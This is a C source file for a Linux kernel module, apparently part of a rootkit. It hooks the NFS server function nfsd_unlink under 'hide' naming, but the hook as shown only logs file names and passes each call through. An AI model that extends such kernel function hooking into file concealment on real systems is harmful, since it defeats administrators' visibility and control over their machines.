#include <linux/sunrpc/svc.h>
#include <linux/types.h>

#include "hide_nfsfh.h"

#include "main.h"
#include "yhook.h"

__be32 (*orig_nfsd_unlink)(struct svc_rqst *rqstp, struct svc_fh *fhp,
                                  int type, char *fname, int flen);

__be32 hook_nfsd_unlink(struct svc_rqst *rqstp, struct svc_fh *fhp,
                                int type, char *fname, int flen) {
  pr_info(LOG_PREFIX "fname: %s\n", fname);
  return orig_nfsd_unlink(rqstp, fhp, type, fname, flen);
}

int hide_nfs_init(void) {
  hook_function_name_add("nfsd_unlink", hook_nfsd_unlink, &orig_nfsd_unlink);
  return 0;
}

int hide_nfs_exit(void) {
  hook_function_del("nfsd_unlink");
  return 0;
}
